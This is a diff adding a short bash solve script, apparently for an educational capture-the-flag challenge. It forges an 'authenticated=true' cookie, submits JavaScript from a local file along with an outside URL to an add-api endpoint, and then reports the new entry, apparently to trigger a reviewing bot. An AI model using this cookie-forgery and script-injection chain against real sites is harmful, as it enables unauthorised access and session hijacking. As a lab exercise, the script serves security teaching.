@@ -1,0 +1,20 @@
+#!/usr/bin/bash
+
+url="http://linux1.cs.nctu.edu.tw:5000/api"
+JS=$(cat sol.js)
+
+resp=$(curl -s -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -b "authenticated=true" \
+            -d "url=${url}&javascript=${JS}" \
+            http://edu-ctf.zoolab.org:10010/add-api)
+
+api_id=$(echo $resp | awk '{print $8}')
+
+alias="abc123"
+
+resp=$(curl -s -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -b "authenticated=true" \
+            -d "id=${api_id}&alias=${alias}" \
+            http://edu-ctf.zoolab.org:10010/report)
